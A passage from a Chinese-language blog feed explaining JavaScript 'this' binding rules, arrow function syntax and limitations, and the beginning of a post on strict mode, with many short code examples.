Error)，那么new表达式中的函数调用将返回该对象引用</li></ul><p>当一个函数用作<strong>构造函数</strong>时（使用<code>new</code>关键字），它的<code>this</code>被绑定到<strong>正在构造的新对象</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;zl&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;object&#x27;</span>,</span><br><span class="line">  <span class="attr">foo1</span>: <span class="keyword">new</span> foo(<span class="string">&#x27;Heternally&#x27;</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(bar.foo1.name); <span class="comment">// Heternally</span></span><br></pre></td></tr></table></figure><p><strong>当构造函数返回值为对象时，直接返回这个对象；否则返回new创建的对象</strong></p><p>所以使用<code>new</code>绑定时，需要判断函数返回的值是否为一个对象，如果是对象，那么<code>this</code>会绑定到返回的对象上。</p><h2 id="ES6箭头函数绑定"><a href="#ES6箭头函数绑定" class="headerlink" title="ES6箭头函数绑定"></a>ES6箭头函数绑定</h2><p>它的 this 是<strong>通过作用域链查到外层作用域的 this ，且指向函数定义时的 this 而非执行时</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">name</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;Heternally&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;text&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;zl&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo1 = foo();</span><br><span class="line">foo1(); <span class="comment">// zl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo2 = foo.call(obj);</span><br><span class="line">foo2(); <span class="comment">// Heternally</span></span><br><span class="line"></span><br><span class="line">foo2.call(obj1); <span class="comment">// Heternally 可以看到，箭头函数的`this`绑定后无法被修改</span></span><br></pre></td></tr></table></figure><h2 id="规则优先级"><a href="#规则优先级" class="headerlink" title="规则优先级"></a>规则优先级</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="keyword">new</span>绑定</span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> Foo();</span><br><span class="line"><span class="built_in">this</span>绑定新的对象上</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、显示绑定 call/apply/bind</span><br><span class="line"><span class="keyword">var</span> obj = foo.call(bar);</span><br><span class="line"><span class="built_in">this</span>绑定到指定对象上</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、隐式绑定</span><br><span class="line"><span class="keyword">var</span> obj = bar.foo();</span><br><span class="line"><span class="built_in">this</span>绑定到调用方法的对象上</span><br><span class="line">如果存在链式调用， <span class="built_in">this</span> 永远指向最后调用它的那个对象 </span><br><span class="line">隐式绑定丢失：起函数别名，通过别名运行；函数作为参数会造成隐式绑定丢失。</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、默认绑定</span><br><span class="line">foo();</span><br><span class="line"><span class="built_in">this</span>在严格模式下绑定到<span class="literal">undefined</span></span><br><span class="line">在非严格模式下绑定到全局对象</span><br></pre></td></tr></table></figure><h1 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h1><p><strong>箭头函数表达式</strong>的语法比<strong>函数表达式</strong>更简洁，并且没有自己的<code>this</code>，<code>arguments</code>，<code>super</code>或<code>new.target</code>。</p><p>箭头函数表达式更适用于那些本来需要匿名函数的地方，并且它不能用作构造函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(param1, param2, …, paramN) =&gt; &#123; statements &#125;</span><br><span class="line"></span><br><span class="line">(param1, param2, …, paramN) =&gt; expression <span class="comment">//相当于：(param1, param2, …, paramN) =&gt;&#123; return expression; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当只有一个参数时，圆括号是可选的：</span></span><br><span class="line">(singleParam) =&gt; &#123; statements &#125;</span><br><span class="line">singleParam =&gt; &#123; statements &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 没有参数的函数应该写成一对圆括号。</span></span><br><span class="line">() =&gt; &#123; statements &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加括号的函数体返回对象字面量表达式：</span></span><br><span class="line">params =&gt; (&#123;<span class="attr">foo</span>: bar&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//支持剩余参数和默认参数</span></span><br><span class="line">(param1, param2, ...rest) =&gt; &#123; statements &#125;</span><br><span class="line">(param1 = defaultValue1, param2, …, paramN = defaultValueN) =&gt; &#123;</span><br><span class="line">    statements &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同样支持参数列表解构</span></span><br><span class="line"><span class="keyword">let</span> f = <span class="function">(<span class="params">[a, b] = [<span class="number">1</span>, <span class="number">2</span>], &#123;x: c&#125; = &#123;x: a + b&#125;</span>) =&gt;</span> a + b + c;</span><br><span class="line">f();  <span class="comment">// 6</span></span><br></pre></td></tr></table></figure><p>引入箭头函数有两个方面的作用：<strong>更简短的函数</strong>并且不绑定<code>this</code>。</p><h2 id="没有单独的this"><a href="#没有单独的this" class="headerlink" title="没有单独的this"></a>没有单独的<code>this</code></h2><p>在箭头函数出现之前，每一个新函数根据它是被如何调用的来定义这个函数的this值：</p><ul><li>如果该函数是一个构造函数，this指针指向一个新的对象</li><li>在严格模式下的函数调用下，this指向<code>undefined</code></li><li>如果该函数是一个对象的方法，则它的this指针指向这个对象</li><li>等等</li></ul><p><code>This</code>被证明是令人厌烦的面向对象风格的编程。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Person() 构造函数定义 `this`作为它自己的实例.</span></span><br><span class="line">  <span class="built_in">this</span>.age = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> <span class="title">growUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 在非严格模式, growUp()函数定义 `this`作为全局对象,</span></span><br><span class="line">    <span class="comment">// 与在 Person()构造函数中定义的 `this`并不相同.</span></span><br><span class="line">    <span class="built_in">this</span>.age++;</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Person();</span><br></pre></td></tr></table></figure><p>在ECMAScript 3/5中，通过将<code>this</code>值分配给封闭的变量，可以解决<code>this</code>问题。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> that = <span class="built_in">this</span>;</span><br><span class="line">  that.age = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> <span class="title">growUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 回调引用的是`that`变量, 其值是预期的对象.</span></span><br><span class="line">    that.age++;</span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者，可以创建<strong>绑定函数</strong>，以便将预先分配的<code>this</code>值传递到绑定的目标函数（上述示例中的<code>growUp()</code>函数）。</p><p>箭头函数不会创建自己的<code>this</code><strong>,它只会从自己的作用域链的上一层继承this</strong>。因此，在下面的代码中，传递给<code>setInterval</code>的函数内的<code>this</code>与封闭函数中的<code>this</code>值相同：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.age = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.age++; <span class="comment">// |this| 正确地指向 p 实例</span></span><br><span class="line">  &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Person();</span><br></pre></td></tr></table></figure><h2 id="与严格模式的关系"><a href="#与严格模式的关系" class="headerlink" title="与严格模式的关系"></a>与严格模式的关系</h2><p>鉴于 <code>this</code> 是词法层面上的，严格模式中与 <code>this</code> 相关的规则都将被忽略。</p><p>普通函数严格模式下this指向undefined。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function">() =&gt;</span> &#123; <span class="string">&#x27;use strict&#x27;</span>; <span class="keyword">return</span> <span class="built_in">this</span>; &#125;;</span><br><span class="line">f() === <span class="built_in">window</span>; <span class="comment">// 或者 global</span></span><br></pre></td></tr></table></figure><p>严格模式的其他规则依然不变。</p><h2 id="通过call、apply或bind调用不能绑定this"><a href="#通过call、apply或bind调用不能绑定this" class="headerlink" title="通过call、apply或bind调用不能绑定this"></a>通过call、apply或bind调用不能绑定this</h2><p>由于箭头函数没有自己的this指针，通过 <code>call()</code> 、 <code>apply()</code> 或<code>bind()</code>方法调用一个函数时，<strong>只能传递参数（不能绑定this）</strong>，他们的<strong>第一个参数会被忽略</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> adder = &#123;</span><br><span class="line">  <span class="attr">base</span> : <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line">  <span class="attr">add</span> : <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> f = <span class="function"><span class="params">v</span> =&gt;</span> v + <span class="built_in">this</span>.base;</span><br><span class="line">    <span class="keyword">return</span> f(a);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">addThruCall</span>: <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> f = <span class="function"><span class="params">v</span> =&gt;</span> v + <span class="built_in">this</span>.base;</span><br><span class="line">    <span class="keyword">var</span> b = &#123;</span><br><span class="line">      <span class="attr">base</span> : <span class="number">2</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> f.call(b, a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(adder.add(<span class="number">1</span>));         <span class="comment">// 输出 2</span></span><br><span class="line"><span class="built_in">console</span>.log(adder.addThruCall(<span class="number">1</span>)); <span class="comment">// 仍然输出 2</span></span><br></pre></td></tr></table></figure><h2 id="不绑定arguments"><a href="#不绑定arguments" class="headerlink" title="不绑定arguments"></a>不绑定<code>arguments</code></h2><p>箭头函数不绑定Arguments 对象。因此，在本示例中，<code>arguments</code>只是引用了封闭作用域内的arguments：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">arguments</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> arr = <span class="function">() =&gt;</span> <span class="built_in">arguments</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">arr(); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> f = <span class="function">() =&gt;</span> <span class="built_in">arguments</span>[<span class="number">0</span>] + n; <span class="comment">// 隐式绑定 foo 函数的 arguments 对象. arguments[0] 是 n,即传给foo函数的第一个参数</span></span><br><span class="line">  <span class="keyword">return</span> f();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(<span class="number">1</span>); <span class="comment">// 2</span></span><br><span class="line">foo(<span class="number">2</span>); <span class="comment">// 4</span></span><br><span class="line">foo(<span class="number">3</span>); <span class="comment">// 6</span></span><br><span class="line">foo(<span class="number">3</span>,<span class="number">2</span>);<span class="comment">//6</span></span><br></pre></td></tr></table></figure><p>在大多数情况下，使用<strong>剩余参数</strong>是相较使用<code>arguments</code>对象的更好选择。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> f = <span class="function">(<span class="params">...args</span>) =&gt;</span> args[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">return</span> f(arg);</span><br><span class="line">&#125;</span><br><span class="line">foo(<span class="number">1</span>); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">arg1,arg2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> f = <span class="function">(<span class="params">...args</span>) =&gt;</span> args[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> f(arg1,arg2);</span><br><span class="line">&#125;</span><br><span class="line">foo(<span class="number">1</span>,<span class="number">2</span>);  <span class="comment">//2</span></span><br></pre></td></tr></table></figure><h2 id="使用箭头函数作为方法"><a href="#使用箭头函数作为方法" class="headerlink" title="使用箭头函数作为方法"></a>使用箭头函数作为方法</h2><p>如上所述，箭头函数表达式对非方法函数是最合适的。让我们看看当我们试着把它们作为方法时发生了什么。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">i</span>: <span class="number">10</span>,</span><br><span class="line">  <span class="attr">b</span>: <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="built_in">this</span>.i, <span class="built_in">this</span>),</span><br><span class="line">  <span class="attr">c</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log( <span class="built_in">this</span>.i, <span class="built_in">this</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.b();</span><br><span class="line"><span class="comment">// undefined, Window&#123;...&#125;</span></span><br><span class="line">obj.c();</span><br><span class="line"><span class="comment">// 10, Object &#123;...&#125;</span></span><br></pre></td></tr></table></figure><p>箭头函数没有定义this绑定。</p><h2 id="不能使用-new-操作符"><a href="#不能使用-new-操作符" class="headerlink" title="不能使用 new 操作符"></a>不能使用 <code>new</code> 操作符</h2><p>箭头函数不能用作构造器，和 <code>new</code>一起用会抛出错误。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Foo = <span class="function">() =&gt;</span> &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> foo = <span class="keyword">new</span> Foo(); <span class="comment">// TypeError: Foo is not a constructor</span></span><br></pre></td></tr></table></figure><h2 id="没有prototype属性"><a href="#没有prototype属性" class="headerlink" title="没有prototype属性"></a>没有<code>prototype</code>属性</h2><p>箭头函数没有<code>prototype</code>属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Foo = <span class="function">() =&gt;</span> &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(Foo.prototype); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><h2 id="不能使用-yield-关键字"><a href="#不能使用-yield-关键字" class="headerlink" title="不能使用 yield 关键字"></a>不能使用 <code>yield</code> 关键字</h2><p> <code>yield</code> 关键字通常不能在箭头函数中使用（除非是嵌套在允许使用的函数内）。因此，箭头函数<strong>不能用作函数生成器</strong>。</p><h2 id="函数体"><a href="#函数体" class="headerlink" title="函数体"></a>函数体</h2><p>箭头函数可以有一个“简写体”或常见的“块体”。</p><p>在一个简写体中，只需要一个表达式，并附加一个隐式的返回值。在块体中，必须使用明确的<code>return</code>语句。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> func = <span class="function"><span class="params">x</span> =&gt;</span> x * x;</span><br><span class="line"><span class="comment">// 简写函数 省略return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = <span class="function">(<span class="params">x, y</span>) =&gt;</span> &#123; <span class="keyword">return</span> x + y; &#125;;</span><br><span class="line"><span class="comment">//常规编写 明确的返回值</span></span><br></pre></td></tr></table></figure><h2 id="返回对象字面量"><a href="#返回对象字面量" class="headerlink" title="返回对象字面量"></a>返回对象字面量</h2><p>记住用<code>params =&gt; &#123;object:literal&#125;</code>这种简单的语法返回对象字面量是行不通的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> func = <span class="function">() =&gt;</span> &#123; <span class="attr">foo</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="comment">// Calling func() returns undefined!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = <span class="function">() =&gt;</span> &#123; <span class="attr">foo</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125; &#125;;</span><br><span class="line"><span class="comment">// SyntaxError: function statement requires a name</span></span><br></pre></td></tr></table></figure><p>这是因为花括号（<code>&#123;&#125;</code> ）里面的代码被解析为一系列语句（即 <code>foo</code> 被认为是一个标签，而非对象字面量的组成部分）。</p><p>所以，记得用圆括号把对象字面量包起来：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> func = <span class="function">() =&gt;</span> (&#123;<span class="attr">foo</span>: <span class="number">1</span>&#125;);</span><br></pre></td></tr></table></figure><h2 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h2><p>箭头函数在参数和箭头之间不能换行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> func = <span class="function">()</span></span><br><span class="line"><span class="function">           =&gt;</span> <span class="number">1</span>;</span><br><span class="line"><span class="comment">// SyntaxError: expected expression, got &#x27;=&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>但是，可以通过在 ‘=&gt;’ 之后换行，或者用 ‘( )’、’{ }’来实现换行，如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> func = <span class="function">(<span class="params">a, b, c</span>) =&gt;</span></span><br><span class="line">  <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = <span class="function">(<span class="params">a, b, c</span>) =&gt;</span> (</span><br><span class="line">  <span class="number">1</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = <span class="function">(<span class="params">a, b, c</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = <span class="function">(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">  a,</span></span></span><br><span class="line"><span class="params"><span class="function">  b,</span></span></span><br><span class="line"><span class="params"><span class="function">  c</span></span></span><br><span class="line"><span class="params"><span class="function"></span>) =&gt;</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不会有语法错误</span></span><br></pre></td></tr></table></figure><h2 id="解析顺序"><a href="#解析顺序" class="headerlink" title="解析顺序"></a>解析顺序</h2><p>虽然箭头函数中的箭头不是运算符，但箭头函数具有与常规函数不同的特殊运算符优先级解析规则。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> callback;</span><br><span class="line"></span><br><span class="line">callback = callback || <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;; <span class="comment">// ok</span></span><br><span class="line"></span><br><span class="line">callback = callback || <span class="function">() =&gt;</span> &#123;&#125;;</span><br><span class="line"><span class="comment">// SyntaxError: invalid arrow-function arguments</span></span><br><span class="line"></span><br><span class="line">callback = callback || (<span class="function">() =&gt;</span> &#123;&#125;);    <span class="comment">// ok</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;this指向&quot;&gt;&lt;a href=&quot;#this指向&quot; class=&quot;headerlink&quot; title=&quot;this指向&quot;&gt;&lt;/a&gt;this指向&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;引言&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;要理解&lt;code&gt;this&lt;/co</summary>
      
    
    
    
    <category term="ES6+" scheme="https://lesliewaong.top/categories/ES6/"/>
    
    
    <category term="箭头函数" scheme="https://lesliewaong.top/tags/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/"/>
    
    <category term="this" scheme="https://lesliewaong.top/tags/this/"/>
    
  </entry>
  
  <entry>
    <title>严格模式</title>
    <link href="https://lesliewaong.top/posts/7108a574.html"/>
    <id>https://lesliewaong.top/posts/7108a574.html</id>
    <published>2022-02-18T13:01:02.000Z</published>
    <updated>2022-03-25T14:08:26.396Z</updated>
    
    <content type="html"><![CDATA[<h1 id="严格模式"><a href="#严格模式" class="headerlink" title="严格模式"></a>严格模式</h1><h2 id="严格模式的理解"><a href="#严格模式的理解" class="headerlink" title="严格模式的理解"></a>严格模式的理解</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><strong>理解</strong>：除了正常运行模式(混杂模式)，ES5添加了第二种运行模式：”严格模式”（strict mode）。</p><p>顾名思义，这种模式使得Javascript在更严格的语法条件下运行。</p><p><strong>目的</strong>：</p><ul><li><p>消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为</p></li><li><p>消除代码运行的一些不安全之处，为代码的安全运行保驾护航</p></li><li><p>为未来新版本的Javascript做好铺垫</p></li></ul><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ul><li><p>针对整个脚本文件：将<code>use strict</code>放在脚本文件的第一行，则整个脚本文件将以严格模式运行。</p></li><li><p>针对单个函数：将<code>use strict</code>放在函数体的第一行，则整个函数以严格模式运行。</p></li></ul><p>PS：如果浏览器不支持，则这句话只解析为一条简单的语句, 没有任何副作用。</p><p>脚本文件的变通写法：因为第一种调用方法不利于文件合并，所以更好的做法是，借用第二种方法，将整个脚本文件放在一个立即执行的匿名函数之中。</p><h2 id="严格模式和普通模式的区别"><a href="#严格模式和普通模式的区别" class="headerlink" title="严格模式和普通模式的区别"></a>严格模式和普通模式的区别</h2><h3 id="1-全局变量必须显式声明"><a href="#1-全局变量必须显式声明" class="headerlink" title="1.全局变量必须显式声明"></a>1.全局变量必须显式声明</h3><p><strong>在正常模式中，如果一个变量没有声明就赋值，默认是全局变量。</strong></p><p><strong>严格模式</strong>禁止这种用法，<strong>全局变量必须显式声明</strong>。</p><p>示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line">name=<span class="string">&quot;xiaomi&quot;</span>;<span class="comment">//报错，name未声明</span></span><br><span class="line"><span class="keyword">for</span>(item <span class="keyword">in</span> array)&#123;</span><br><span class="line"><span class="comment">//报错，item未声明</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在严格模式下，变量都必须先用<code>var</code>、<code>let</code>或<code>const</code>声明，然后再使用。</p><h3 id="2-禁止动态绑定"><a href="#2-禁止动态绑定" class="headerlink" 